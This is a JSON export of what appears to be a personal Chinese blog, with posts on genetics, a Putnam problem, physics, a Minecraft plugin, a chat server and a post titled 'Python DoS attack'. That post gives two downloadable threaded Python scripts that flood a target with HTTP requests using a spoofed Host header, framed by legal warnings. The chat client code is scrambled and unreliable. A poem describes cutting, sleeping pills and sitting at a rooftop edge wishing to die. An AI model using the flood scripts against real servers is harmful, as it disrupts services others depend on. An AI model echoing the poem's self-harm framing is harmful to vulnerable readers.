{"pages":[],"posts":[{"title":"8月15日生物课随笔","text":"课程相关此为2021年8月15日生物学科营笔记，仅供学习参考。 下载 0815biology.pdf 本节课件。 课程回放地址：腾讯课堂回放，百度网盘（提取码：j37q）。 遗传学中的有关概念交配类杂交 任意两种基因型的个体进行有性生殖产生下一代的行为。 自交 同种基因型的个体间杂交（不一定是自己和自己）。 测交 检测某一显性个体是纯合子还是杂合子。 若显性个体和隐性个体杂交后，后代均为显性个体，则显性个体为纯合子。 若显性个体和隐性个体杂交后，后代中显性个体和隐性个体的比例为$1:1$，则显性个体为杂合子。 隐性个体$aa$只能提供一种配子（$a$），而显性个体可能提供两种配子（$A$或$a$）：若后代均为显性，则显性个体仅可能提供配子$A$，故显性个体为$AA$（纯合子）；若后代部分显性、部分隐性，则显性个体两种配子均可能提供，故显性个体为$Aa$（杂合子）。 正交（反交） 相对概念，由父本、母本决定。 例如定义高茎作为母本、矮茎作为父本时为正交，则矮茎作为母本、高茎作为父本时为反交。 回交 （群体遗传） $F_1$和亲代之一杂交。 性状类相对性状 同一性状的不同表现型，显性性状和隐性性状。 显性基因$A$控制显性性状，隐性基因$a$控制隐性性状。$A$和$a$同时出现时，仅表现出显性性状。例如$AA$和$Aa$表现出显性性状，$aa$表现出隐性性状（不完全显性等情况另外，此处仅讨论完全显性）。 性状分离 子代与亲代的性状不同。例如$F_1$为高茎，自交后高茎与矮茎的比例为$3:1$，即出现了性状分离。 显性的相对性 例如红花（$RR$）与白花（$rr$）杂交，子代为粉色（$Rr$），称为不完全显性。 基因类基因 有遗传效应的DNA片段。 等位基因 在同源染色体上相同位置，控制相对性状的基因。 非等位基因 若$A$与$a$、$B$与$b$为等位基因，则$A$与$B$、$a$与$b$为非等位基因。 非同源染色体上的基因自由组合。 当$A$、$B$在1号染色体上，$E$在2号染色体上，则$A$和$B$是连锁的、$A$和$E$是自由组合的、$B$和$E$是自由组合的。 相同基因 在同源染色体上相同位置，可以是等位基因（$A$和$a$）也可以是相同基因（$A$和$A$）。 个体类性状（抽象）$\\rightarrow$ 表现型（具象）。基因决定性状，基因型受环境影响决定表现型。 纯合子 自交后代不出现性状分离，自交后代均为纯合子。例如$AA$、$aa$、$AAbb$等。 杂合子 只要有一对基因杂合就是杂合子，自交后代既有纯合子又有杂合子，杂合子自交往往出现性状分离（并不绝对）。例如$Aa$等。 孟德尔获得成功的原因统计学的方法非常重要。 基因的分离定律实质生殖 产生下一代。 基因重组 控制不同性状的基因发生了重新组合。 适用范围： 有性生殖 发生了基因重组的生殖方式。精卵结合（卵式生殖）最为常见。 真核生物 原核生物不存在基因分离。 细胞核遗传 真核生物的细胞质遗传不遵循此种规律。 交配类型及结果①②③ 显性纯合子个体和其他显性（或隐性）个体杂交。由于显性纯合子（$DD$）只能产生一种配子（$D$），故后代表型均为显性。 ④ 杂合子自交。 ⑤⑥ 隐性个体和其他显性（或隐性）个体杂交。 应用在杂交育种上的应用显性性状的选择 例如与平常不同的植物品种，自交后红（$AA$与$Aa$）、白（$aa$）比例为$3:1$，继续自交比例为$5:3$，继续自交比例为$9:7$。若共自交$n$代，则红、白比例为$(2^n+1):(2^n-1)$。 课后作业 $Aa$连续自交, 每一代均淘汰$aa$个体. 请问: 经过多少代以后, $AA$所占的比 $\\geq95%$? 自交的群体中杂合子是非常少的。 在人类遗传病预防上的应用隐性遗传病 禁止近亲结婚。每个人都是杂合子，携带了很多隐性致病基因，近亲结婚出现隐性纯合的概率大大增加，从而使后代生病。后代出现畸形胎儿的可能性非常大。 解题指导显隐性确定 例题 性状和基因之间不是一一对应的关系，可能由两对等位基因控制一对相对性状，但在没有特别说明的情况下可以理解为一一对应。 遗传图解的书写应该包括： 符号 如杂交（$\\times$）、自交（$\\otimes$）、亲本（$P$）、子$n$代（$F_n$）、父本（$♂$）、母本（$♀$）等； 表型 如高茎、矮茎等； 基因型 写在表型的下面； 比例 是否写完整都可以，计算时经常使用$\\frac{1}{4}$、$\\frac{3}{4}$等形式来表达。 系谱图分析 $\\circ$ 正常女性 $\\bullet$ 患病女性 $\\square$ 正常男性 $\\blacksquare$ 患病男性 例题 （1）常染色体的隐性遗传；（2）$Aa$；$aa$；（3）$\\frac{2}{3}$。 育种上的运用 例题 （1）不能确定；（2）选多对有角牛杂交：如果后代都有角，那么有角为隐性性状；如果后代有些有角有些无角，那么有角为显性性状。 随堂演练两只灰身果蝇交配自由交配即为随机交配。 ♀\\♂ $A=p$ $a=q$ $A=p$ $AA=p^2$ $Aa=pq$ $a=q$ $Aa=pq$ $aa=q^2$ 一个二倍体的种群中二倍体的种群 $AA$、$Aa$或$aa$；三倍体即为$AAA$、$AAa$、$Aaa$或$aaa$。 复等位基因 可选的基因不只有$A$和$a$，而是存在$a_1$、$a_2$、$…$、$a_n$。例如人的血型：A型为$I^AI^A$或$I^Ai$，B型为$I^BI^B$或$I^Bi$，AB型为$I^AI^B$，O型为$ii$。","link":"/7924a8a55793/"},{"title":"Python实现DoS攻击","text":"引子一切开发旨在学习，请勿用于非法用途 《中华人民共和国刑法》第二百八十六条 破坏计算机信息系统罪：违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。 另： 在中华人民共和国最高人民法院与最高人民检察院 《关于办理危害计算机信息系统安全刑事案件应用法律若干问题的解释》 中，对破坏计算机信息系统的适用进行了明确：破坏计算机信息系统功能、数据或者应用程序，具有下列情形之一的，应当认定为刑法第二百八十六条第一款和第二款规定的“后果严重”：（一）造成十台以上计算机信息系统的主要软件或者硬件不能正常运行的；（二）对二十台以上计算机信息系统中存储、处理或者传输的数据进行删除、修改、增加操作的；（三）违法所得五千元以上或者造成经济损失一万元以上的；（四）造成为一百台以上计算机信息系统提供域名解析、身份认证、计费等基础服务或者为一万以上用户供服务的计算机信息系统不能正常运行累计一小时以上的；（五）造成其他严重后果的。实施前款规定行为，具有下列情形之一的，应当认定为破坏计算机信息系统“后果特别严重”：（一）数量或者数额达到前款第（一）项至第（三）项规定标准五倍以上的；（二）造成为五百台以上计算机信息系统提供域名解析、身份认证、计费等基础服务或者为五万以上用户供服务的计算机信息系统不能正常运行累计一小时以上的；（三）破坏国家机关或者金融、电信、交通、教育、医疗、能源等领域提供公共服务的计算机信息系统的能、数据或者应用程序，致使生产、生活受到严重影响或者造成恶劣社会影响的；（四）造成其他特别严重后果的。 一切开发旨在学习，请勿用于非法用途 通信原理socket模拟客户端向目标服务器不断发送空请求。使用threading增加请求量，起到攻击的效果。 无计数版显然，无计数版的攻击周期更短，但无法了解已经发出了多少请求。 下载dossilent.py 下方的代码。 Python 31234567891011121314151617181920212223# 一切开发旨在学习，请勿用于非法用途import socketimport threading# 确认攻击目标target = '127.0.0.1' # 攻击目标的 IP 地址fake_ip = '223.30.81.143' # 随机生成的 IP 地址，用于伪装port = 80 # 攻击目标的端口def attack(): while True: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target, port)) # 连接至服务器 # 发送空请求 s.sendto((&quot;GET /&quot; + target + &quot; HTTP/1.1\\r\\n&quot;).encode('ascii'), (target, port)) s.sendto((&quot;Host: &quot; + fake_ip + &quot;\\r\\n\\r\\n&quot;).encode('ascii'), (target, port)) # 断开连接 s.close()for i in range(1): # 将 1 替换为你需要的线程数量 thread = threading.Thread(target=attack) thread.start() 计数版 下载dos.py 下方的代码。 Python 31234567891011121314151617181920212223242526272829303132# 一切开发旨在学习，请勿用于非法用途import socketimport threading# 确认攻击目标target = '127.0.0.1' # 攻击目标的 IP 地址fake_ip = '223.30.81.143' # 随机生成的 IP 地址，用于伪装port = 80 # 攻击目标的端口# 计数attack_num = 0def attack(): while True: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target, port)) # 连接至服务器 # 发送空请求 s.sendto((&quot;GET /&quot; + target + &quot; HTTP/1.1\\r\\n&quot;).encode('ascii'), (target, port)) s.sendto((&quot;Host: &quot; + fake_ip + &quot;\\r\\n\\r\\n&quot;).encode('ascii'), (target, port)) # 计数模块 global attack_num attack_num += 1 print(attack_num) # 断开连接 s.close()for i in range(1): # 将 1 替换为你需要的线程数量 thread = threading.Thread(target=attack) thread.start() 后话由于Python拉跨的效率，实际上此处提供的程序仅能增加访问延迟，而不至于将服务器攻击崩溃。此处仅提供类似流程，若有能力可用其它高效率的语言（如C++）进行重写。DDoS与此相近，只需用大量的计算机同时向单一目标计算机发起DoS攻击即可。这东西玩玩就好了，打打自己的服务器看看效果就可以了，别太较真，高强度的DoS或DDoS攻击是违法的。拓展：知乎：应对DDoS攻击的法律武器一切开发旨在学习，请勿用于非法用途。","link":"/dd6783bcdf6b/"},{"title":"Python实现TCP聊天服务器","text":"引子刚刚琢磨了一下socket，随手摸了一个TCP聊天出来。 通信原理服务端开放端口用于通信。当有客户端加入时，向其他客户端广播用户加入消息。当客户端发送信息时，接受并广播给其它客户端。当有客户端退出时，向其他客户端广播用户退出消息。 服务端 下载 server.py 下方的代码。 Python 312345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import socketimport threading# 初始化服务器server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)server.bind(('127.0.0.1', 32768))server.listen()clients = []nicknames = []# 广播消息def broadcast(message): for client in clients: client.send(message)# 处理消息def handle(client): while True: try: # 广播消息 message = client.recv(1024) broadcast(message) except: # 处理用户退出请求 index = clients.index(client) clients.remove(client) client.close() nickname = nicknames[index] broadcast('{} 退出了聊天'.format(nickname).encode('utf-8')) nicknames.remove(nickname) break# 监听消息def receive(): while True: # 接受连接并请求昵称 client, address = server.accept() client.send('NICK'.encode('utf-8')) nickname = client.recv(1024).decode('utf-8') nicknames.append(nickname) clients.append(client) # 通知用户进入服务器 print(&quot;{} ({}:{}) 加入了聊天&quot;.format(nickname, *address)) broadcast(&quot;{} 加入了聊天&quot;.format(nickname).encode('utf-8')) client.send('已连接至聊天服务器'.encode('utf-8')) # 创建线程处理信息 thread = threading.Thread(target=handle, args=(client,)) thread.start()receive() 客户端 下载 client.py 下方的代码。 Python 3123456789101112131415161718192021222324252627282930313233343536import socketimport threading# 输入昵称nickname = input(&quot;请输入昵称: &quot;)# 连接至服务器 while True: message = '{}: {}'.format(nickname, input('')) client.send(message.encode('utf-8'))# 多线程用于收发信息receive_thread = threading.Thread(target=receive)receive_thread.start()write_thread = threading.Thread(target=wrclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)client.connect(('127.0.0.1', 32768))# 监听服务器并回应昵称请求def receive(): while True: try: message = client.recv(1024).decode('utf-8') if message == 'NICK': client.send(nickname.encode('utf-8')) else: print(message) except: # 出错时关闭与服务器连接 print(&quot;意外的错误出现&quot;) client.close() break# 向服务器发送信息def write():ite)write_thread.start()","link":"/9befd3d1ed36/"},{"title":"recorderBot 使用说明","text":"此为版本草图, 插件仍处于预开发周期.你可以在此处找到项目的 Github 仓库. 简介recorderBot 是由 XavierWah 开发用于 MCDReforged 的插件. 此插件基于 carpet 的 /player 命令进行拓展, 加入了记录信息, 查询历史记录等功能, 辅助玩家在服务器中更好的使用 Bot 协作.此使用说明适用于 recorderBot v1.0-alpha . 安装请将 recorderBot 主体以及其 API 目录放入任一 MCDReforged 插件目录中 ( 默认为 /plugins ) , 并启动 MCDReforged , 等待插件向 /recorderBot 中写入日志文件等信息, 本插件运行中储存的任何数据都将保存在此目录中. 指令大纲 !!bot 插件总指令, 调出帮助菜单. !!bot create [参数] 生成 Bot . !!bot info &lt; Bot 识别号&gt; 查询 Bot 的信息. !!bot list [页码] 查看服务器内的 Bot . !!bot modify &lt; Bot 识别号&gt; &lt;修改项&gt; [修改值] 修改 Bot 的属性. !!bot remove &lt; Bot 识别号&gt; 删除 Bot . 其中&lt;&gt;表示必须项, [ ]表示可选项. 下同. Bot 识别号Bot 识别号用于分辨不同的 Bot , 在本插件的使用过程中十分重要. 每个 Bot 识别号指代唯一的 Bot , 但多个 Bot 识别号可用于指代同一个 Bot . Bot 识别号使用以下方法生成: 名称 直接使用 Bot 的游戏名. 此处是否加入 Bot_ 前缀均可识别. 序号 使用 Bot 生成时的唯一序号. !!bot create 详解!!bot create 用于生成 Bot . 其后可选的参数用来指定其坐标, 注释, 名称, 占用时长等属性. 若使用 /player spawn 生成 Bot , 其属性同样将被记录至此插件. !!bot create 可接受参数, 使 Bot 在生成时即拥有某些属性. 参数应逐个追加在命令后, 错误的格式有可能导致插件解析错误, 以下是可选参数: -autoleave 或 -a 设置 Bot 到时后自动退出，此项无需参数. 必须与 -time 共同使用. -coordinate 或 -c &lt;X坐标&gt; &lt;Y坐标&gt; &lt;Z坐标&gt; 指定 Bot 坐标, 必须为整数. 默认为创建Bot时的坐标. -description 或 -d &lt;注释内容&gt; 注释 Bot , 可用于记录Bot的作用等, 为字符串, 多个空格将会被缩减为单个. 默认为创建Bot时的坐标. -name 或 -n &lt;名称&gt; 指定 Bot 名称, 必须为字母、数字或下划线. 默认为其创建时的时间. -time 或 -t &lt;时间&gt; 指定占用 Bot 的时长, 为一连续字符串(不可包含空格). 此占用时长仅作为显示, 提示他人何时合适将Bot删除, 并不阻挡玩家删除Bot. 默认为随时可以删除. 下列形式可表述此处的时长： 时长 例如 10m 表示 10 分钟内一直有用处, 1d12h 表示 1 天 12 小时内一直有用处, 1d 表示一天内一直有用处等. 支持 m (分钟), h (小时), d (天)等单位, 不同时间单位可以混用. 当时长结束时, 将自动改为 instant . 特殊 仅有 eternity (或 e , 永远不要删除)与 instant (或 i , 随时可以删除)这 2 种候选. 如果你不清楚具体需要使用多久Bot, 那么推荐选用此种表述. !!bot modify 详解!!bot modify 用于修改 Bot 的属性, 可以在不重新生成 Bot 的基础上修改如注释, 名称, 使用玩家, 占用时长等属性. 修改项代表将要修改的属性名, 不同的属性名对应不同格式的修改值, 以下是可选修改项: autoleave 或 a 设置 Bot 到时后是否自动退出, 修改值为 true 或 false . description 或 d 修改 Bot 的注释, 修改值为字符串. name 或 n 修改 Bot 的名称, 修改值为字母、数字或下划线. 修改此项时, Bot 将重新进入游戏. takeover 修改使用 Bot 的玩家, 此项无需填入修改值, 自动修改为输入指令的玩家. time 或 t 修改占用 Bot 的时长, 请参照!!bot create -t部分填入内容. 在字符串前添加单个字符+表示在原有时间上延长对应时间, 添加单个字符-表示在原有时长上缩短对应时间. v2 的坑先挖起来 增加 !!bot history 语法, 支持查看曾经的 Bot . 增加 !!bot create -resume 语法, 支持恢复曾经的 Bot . v3 的坑先挖起来 增加 !!bot preset, !!bot create preset 语法, 支持自定义 Bot 模板. 增加 !!bot schedule 语法, 支持自定义 Bot 工作周期.","link":"/016d7fcef025/"},{"title":"下载本站提供的文件","text":"如果文章中出现“”图标，代表此处有供下载的文件，点击图标即可下载对应文件。 通常附近会附加文件名、文件信息等内容用于说明文件内容。代码等通常是站内文件。如果文件较大，通常会使用蓝奏云外链。下方的代码块及下载入口用于测试。 下载 helloworld.py 下方的代码。 Python 31print('Hello world!') 若点击后进入新页面而不是下载文件，可右键新页面背景，选择另存为进行下载。这通常是因为浏览器将其分析为纯文本文件，而自动打开了。","link":"/28f36c736928/"},{"title":"关于1996年普特南A-6题的讨论","text":"引子 Four points are chosen at random on the surface of a sphere. What is the probability that the center of the sphere lies inside the tetrahedron whose vertices are at the four points? (It is understood that each point is independently chosen relative to a uniform distribution on the sphere.) 原题此题为1996年第53届普特南A-6题。题面英文原文已在引子中给出。中文翻译如下： 在球体的表面随机选择四个点，问球心位于以四点为顶点的四面体内部的概率是多少？（每个点都是独立选择的。）翻译可能不精确，建议根据原文辅助理解。 先简单聊聊我对概率论等并没有深入的了解，看到这题之后“随机”字眼让我不知道如何处理，也正是因此我无法给出详细证明的原因。证明是一件苛刻的事，等日后我有了足够的数学基础，达到可以证明此题，我会试着在此页写下我的证明过程。 此类三维的题目不妨先化作更低维度，再探寻普遍规律。例如在二维时，可以化为： 在圆上随机选择三个点，问圆心位于以三点为顶点的三角形内部的概率是多少？ 当随意选择两点$P_1$、$P_2$后，若想$\\triangle P_1P_2P_3$过圆心，则$P_3$只可能在$\\overset{\\frown}{P_1P_2}$关于圆心$O$在$\\odot O$的投影弧上，也就是下图中的加粗部分。 此时圆心在$\\triangle P_1P_2P_3$内的概率即为在$\\odot O$上随意取点，其在$\\overset{\\frown}{P_1’P_2’}$上的概率，即为$\\frac{\\angle P_1OP_2}{2\\pi}$。（我们定义$0&lt;\\angle P_1OP_2&lt;\\pi$） 由于任意取点$P_1$、$P_2$，故$\\angle P_1OP_2$的平均期望为$\\frac{\\pi}{2}$，此时$P=\\frac{1}{4}$。 因此在圆上随机选择三个点，圆心位于以三点为顶点的三角形内部的概率为$\\frac{1}{4}$。 我们只需要将其推广到球体上，此时若想四面体包含圆心，则第$4$点一定在球面三角形$P_1P_2P_3$关于球心$O$的投影上。也就是说，落点使得“题目条件符合”的区域由线变为面，此时只需按照曲面的平均期望计算即可。 我最后没解释的通。 回头看特殊的结果在二维时，得出的答案十分特殊，我们是否能够从另一方面解释$\\frac{1}{4}$作为概率是如何出现的。 不将其看作固定两点，而是过圆心作两条任意直线，分别于$\\odot O$交于$A$、$B$、$C$、$D$四点。我们在每条直线上各任取一点，作为前一个方法中固定的$2$点。 此时，在圆上随意取的第三点$E$一定在$\\overset{\\frown}{AC}$、$\\overset{\\frown}{BC}$、$\\overset{\\frown}{AD}$、$\\overset{\\frown}{BD}$中。任取两条直线，随机取两点有四种可能性：$A$和$C$、$A$和$D$、$B$和$C$、$B$和$D$，这四种可能性若使点$E$“符合题目条件”，则分别对应$E$在$\\overset{\\frown}{BD}$、$\\overset{\\frown}{AD}$、$\\overset{\\frown}{BC}$、$\\overset{\\frown}{AC}$上。也就是说，每个$E$的位置对应$1$种“符合”的情况，与另外$3$种“不符合”的情况。 二维时的平均期望即为$\\frac{1}{4}$。 三维时，即作过球心的三条任意不重合直线，交球表于$6$点，在每条直线上各任取一点，作为固定的$3$点。 此时便分出了$8$种不同的取点情况，其中每个第四点的位置对应$1$种“符合”的情况与$7$种“不符合”的情况。即平均期望为$\\frac{1}{8}$。 因此在球体的表面随机选择四个点，球心位于以四点为顶点的四面体内部的概率为$\\frac{1}{8}$。 另一种严谨的解法上述的仅为几何直觉，我相信是写不成严谨的证明过程的。 以下附另一种解法，原文标题Capturing the Origin with Random Points: Generalizations of a Putnam Problem。你也可以在网页查看。 下载putnam1996a6.pdf 下载证明的原文。 欧文的解法假设随便取三点，称其为点$X$、点$Y$、点$Z$，则存在球面三角形$XYZ$在球面上。现尝试取一点$K$，令四面体$KXYZ$包括球心$O$。 延长$XO$、$YO$、$ZO$分别交球面于点$X’$、点$Y’$、点$Z’$。我们发现，对于$XYZ$，点$K$取在$XX’$或$YY’$或$ZZ’$上时题目条件恰好成立。更准确地说，这三条线规定了点$K$的取法空间边界，即对于任何在球面三角形$X’Y’Z’$上的点$K$，题目条件成立。 显然，球面三角形$XYZ$与球面三角形$X’Y’Z’$面积相同。只需找出球面三角形$XYZ$与球体表面积$4\\pi r^2$之比，并相除求得点$K$存在于球面三角形$X’Y’Z’$之内的概率。 令球面三角形中两两夹角角度为$a$、$b$、$c$，面积为$a+b+c-\\pi$。考虑取点为独立同分布，那么显然$abc$可以表示为连续型均匀分布，其分布范围即其期望值为$0\\sim\\pi$，根据连续型均匀分布特性，显然为$\\frac{\\pi}{2}$。代入求得期望面积即$\\frac{3\\pi}{2}-\\pi=\\frac{\\pi}{2}$。球体半径为$r$，则期望面积为$\\frac{\\pi r^2}{2}$。 遵循上文，得到出现在此区间内的概率是$\\frac{\\frac{\\pi r^2}{2}}{4\\pi r^2}$，即$\\frac{1}{8}$。 新生群里的尝试 构造二部图，其中一部顶点为所有不符合条件的四面体，另一部为所有符合条件的四面体。以如下方式构造此图的边：对于每个不符合条件的四面体，过其对应最大面的顶点做高，与球相交于另一点，此点和对应面构成的四面体在这个四面体的邻域之内。于是每个符合条件的四面体的度都是$4$，而每个不符合的，度都是$1$。因此我们随机取此图中一点，在左部的概率是$\\frac{4}{5}$，在右部的概率是$\\frac{1}{5}$，故在球体的表面随机选择四个点，球心位于以四点为顶点的四面体内部的概率为$\\frac{1}{5}$。 此方法会出现“不符合”对应“不符合”的情况，故得到的结果与参考不同。 结语威廉·洛厄尔·普特南数学竞赛，通常简称为普特南竞赛，是美国和加拿大高等教育机构注册的本科大学生的年度数学竞赛，它以世界上最负盛名的大学生数学竞赛被广泛认可。每届共有$12$道试题，这些问题通常只需具备大学数学的基础就能解决，但需要广泛的创造性思维。其分为$A$、$B$两次坐席，每次解决$6$道以从简单到复杂排序的试题。上题即为1996年第53届普特南A-6题。 如果你有其它的解决方案或尝试过程，欢迎在下方评论或给我发电子邮件。若上述过程有误，烦请指出错误以便改正。","link":"/4d2475c9eaa3/"},{"title":"回忆","text":"一首小诗。 我在手臂上用刀片剐出一道又一道伤口然后悉心照料花草般看着它们结痂，看着它们留疤血流出来了又怎样？当是水一般滴到地上会干涸 我在高楼顶伴皓月熬过一夜又一夜孤独然后丝毫不带迟疑地走向天台边缘，坐在深渊旁边泪淌过脸颊又何妨？当是火一般烧尽人间未曾止 那一把把修眉刀一粒粒安眠药引来的只不过是愈来愈糟糕的事实那一具具诊断书一盒盒舍曲林指向的只不过是愈来愈昏暗的未来 哎，如果有一天我永远的睡去请不要怀念我让我像无声地来一般无声地走像生命燃起花朵又把它吹熄","link":"/ca815a90a083/"},{"title":"基于常用变换的字符串加密","text":"引子本文将根据Python，编写一套字符串加密方法。 浅说加密你也许听说过许多常见的加密方法，从古典密码（凯撒密码、维吉尼亚密码等替换式密码或移项式密码）到现代计算机所使用的Base64、DES、AES、3DES、RC4等先进的加密算法。 密码学是研究如何隐密地传递信息的学科。此处的关键词即为“隐秘”和“传递信息”，你需要将明文转换为外人无法或难破译的密文，使得中间传递信息的人即便获取信息也无法得知具体内容。故上述列举中并没有包含MD5等算法，因为这只是信息摘要算法，并无法保证能够还原成原信息。且接收方会和窃听信息的人一样一头雾水，只能通过暴力算法才能够获取信息。例如各位可以试还原下方的简单32位MD5串，其仅包含ASCII的可显示字符。 307A24F535F56DD65F3F6EFA88988D94 因此，我们所设计的算法应该包含以下特点： 可逆性 让密文能够完美的还原成明文。 可解性 加密和解密过程能在有限的时间内完成。 开放性 算法不应限制明文的长度，且时间复杂度需趋近线性。 隐蔽性 算法核心实现部分应经可能隐蔽。 上述提到的加密过程，多在互联网上即可找到对应加密、解密工具，因此我自研了一个加密方法。 思路阐述首先输入原字符串，对其中每个字符求ord()，再转换为$16$进制下的四位，拼接成新字符串。 我无意间发现了盲文点阵在Unicode中恰好占用连续的$256$个空位。再从新字符串中两两选择，得到的值正好处于$0\\sim 256$的区间内，于是对应翻译成盲文点阵，再拼接起来即为成品。 解密就为逆过程。 得到的密文大概长下面这样： ⠛⢃⠛⢏⠛⢏⠛⢋⠛⢎⠛⡕⠛⡊⠛⡊⠛⢓⠛⡼⠛⢑⠛⢄⠛⢀⠛⢍⠛⢒⠛⡼⠛⢃⠛⡉⠛⢓⠛⢔⠛⢕⠛⡊⡡⠛ 后话原代码请自行探索，盲文字符所在区间是从U+2800至U+28FF，只能告诉你这么多了。 毕竟是自用，所以不可能给你透露更多啦—— 也掺杂了其它的步骤在中间，不可能你随随便便就解出来的。 如果能将上文的点阵解出来明文，请在下方留言，我膜拜。 这篇文章是喝完酒写的。","link":"/f685b910b6f0/"},{"title":"推导动能公式","text":"引子前段时间简单自学了微积分相关知识，看着动能公式突然有一个很单纯的想法，决定自己证明一下。 数学证明过程 有一物体$A$，质量为$m_A$，瞬时速度为$v_A$。 假设另有一物体$B$，质量$m_B=m_A$，初始时静止。有一恒力$F$作用于此物体，使其做匀加速直线运动。设此物体不受其它影响。此时 $$\\Delta W_F=\\Delta E_k$$ 若加速至$v_B=v_A$，有 $$W_F=E_k$$ 设加速所用总时间为$T$。由于初速度为$0$，对$a$积分得 $$v(t)=\\int{a}{\\mathrm d}t=at$$ 再对其求定积分得 $$s=\\int_0^T{at}{\\mathrm d}t=\\frac{1}{2}at^2\\Big|_0^T=\\frac{1}{2}aT^2$$ 由$W_F=E_k$、$W_F=Fs$、$F=ma$得 $$W_F=E_k=\\frac{1}{2}FaT^2=\\frac{1}{2}m_Ba^2T^2$$ 由$v_B=aT$得 $$E_k=\\frac{1}{2}m_B(aT)^2=\\frac{1}{2}m_B{v_B}^2$$ 此时$t=T$，由$m_A=m_B$，$v_A=v_B$得 $$E_k=\\frac{1}{2}m_A{v_A}^2$$ 证毕，即 $$E_k=\\frac{1}{2}mv^2$$","link":"/39cd50dde2f3/"},{"title":"新哈莫尼的入场券","text":"引子我于2021年7月4日正式加入新哈莫尼这个群体，这是我个人在晚间沙龙做出的回答以及欧文的回复。 自我介绍本人是五年的玩家，勉强会玩这个游戏。对红石略有涉猎，但创新能力不够。可以当投影工具人。不喜欢孤独，于是来寻找一个社群。我在一定程度上先示明：我的一个好友说我集左右于一，希望不要太介意。 (3)【自我介绍令人惊艳，或真诚且认真】 令人惊艳，且认真又真诚的自我介绍——我已经开始后悔为什么没有给定下4分的最高分了。 新和谐公社这部分我读了十五分钟，仔细读了百科和一些自媒体的介绍，才对你们这个新群体肃然起敬，把自我介绍修改了更正式。我以为我是没有答案的，我目前能够给出的答案，只能是当时资本主义社会几乎独霸的背景，使得新和谐公社内的模式无法推广到更大的区域，而这种模式也需要财富维持才能与外界沟通。我认为发展市场经济并且增大公社的范围可以在一定程度上解决。另外，我不完全认同罗伯特·欧文对于儿童教育的观点，等儿童成人后观念仍可能被外界改变的。 (3)【逻辑清晰，理由充分的解答】 您的看法再正确不过了——这道题本就没有答案，若有答案，哪些实验性公社也不必存在，而地上天国早就被建立起了（笑）。您的答案是诸多说法中，最令人信服的之一。有许多回答者提到了新和谐公社的员工缺乏激励的问题，但欧文早期位于新拉纳克的工厂的成功并不支持这种观点。也有人说，这是因为新和谐公社的管理不思改进，缺乏理论基础，可欧文不仅是一个具有许多论文的思想家，也是非常成功的实业家，自然谈不上不思改进，缺乏理论基础。相对的，您所说的新和谐公社无法对抗崛起的资本主义企业——这些企业依靠压榨劳工获得了巨大的竞争力——正是新和谐公社最为本质的问题之一。当所有企业都拼命压低工资以夺取市场时，给予员工良好待遇的新和谐公社注定无法生存，无人可以反驳这一显而易见的事实。 所幸，在Minecraft的世界中，我们不需要与外界的资本竞争。这正是为何我们坚持将所有玩家置于同一个社区下，并且实行共产制度——只有这样，我们才能避免过度竞争的萌芽。或许有人会质疑道：在纯粹的公有制下，人们缺乏努力的激励。如果所有产物都是共有的，假设人只有物质需求，他们便会依赖于其他人的努力成果。而如果所有人都是这样想的，社会自然陷入缓慢发展的泥潭。不过，如上一句话所说，这是有前提的：“假设人只有物质需求。”当人们具有非物质的，对自尊，责任心，创造性的需求时，这一前提便被打破了。事实上，在Minecraft的世界，随着生电技术的成熟，物资的生产成本无限接近于零，此时人们的主要动力，事实上就不再是随处可见，多如牛毛的物质，而是精神上的，自尊与创造的需求了。这便是为什么新哈莫尼鼓励生电，不换周目以保持高生产力，并且以公有制塑造社区——生电给予了玩家们创造的需求，也给予了玩家们多不胜数的物质，正是乌托邦运行的基础。 事实上，即使是以纯粹的市场体制运行一个发展到中后期的生电服务器，玩家们的主要需求仍然会从物质转变到对自尊和创造性的需求。因为没有外界竞争的存在，此时体制自动地就会向共产转化。然而，前期市场制度残留下的无序发展的结果，如过于频繁的跑图，以及过多重复的，缺少规划的建筑，反倒会损害服务器玩家整体的福利。 尼采和马基雅维利的道德论述因为存在对道德需要不同的阶级。统治者并不需要道德，需要的是武力。因此，统治者不该存在，人人平等时道德便与我们相安无事。 (3)【指出“低等人”和“统治者”不冲突，读者下意识地认为它们冲突导致了矛盾的出现】 首先，我要强调一点：我很讨厌低等人这个说法， 但为了准确性和题目的误导性，我保留了这个用词。 这道题考察的东西有些特殊：尽管看起来比上一题更加开放，本题其实有一个设计的标准答案——这道题与其说是考察答题者对道德的理解，不如说是考察答题者分析题目中模棱两可的说法，直击题目本质的能力。尽管您对这道题已经做出了优秀的解答，我想在这里梳理一下思路，让答案变得更加清晰。让我们重新看一遍题目： 尼采说：「道德只是低等人群体用来阻碍高等人的虚构事物」，而马基雅维利则认为，道德是统治者用于控制他人的工具，两者各以令人信服的推理获得了看似矛盾的结论。您认为这两个论断为何令人感到矛盾呢？ 题目询问读者“这两个论断为何令人感到矛盾”。在前一句的最后，问题则讲述了矛盾的来源：两人的结论，且强调了“看似”这一属性，故而提示了本体的思考方向——找出给读者以错觉之处。回到两句话本身，“道德只是低等人群体用来阻碍高等人的虚构事物”与“道德是统治者用于控制他人的工具”这两句话对道德进行了句式高度接近的描述，稍微缩短一点并且做少许改动，可以将两句话简化为如此形式：对于前者，道德是“低等人统治高等人”的工具。对于后者，道德是“统治者统治他人”的工具。显然，低等人并不一定不是统治者，很多时候，正是所谓的“低等人”统治了“高等人”。雅典的苏格拉底为大众所处死，而苏格拉底自然是尼采眼中的“高等人”，他眼中的“低等人”便是城邦此时的统治者。这两句话故而并不矛盾，只是“低等人”一词，误导性地令人将其与“统治者”分割开来。 您或许已经注意到了，您的答案与这个设计的答案有些不同，但仍然获得了满分。我反复阅读了您的答案许多遍，最终决定给予您满分，理由如下： 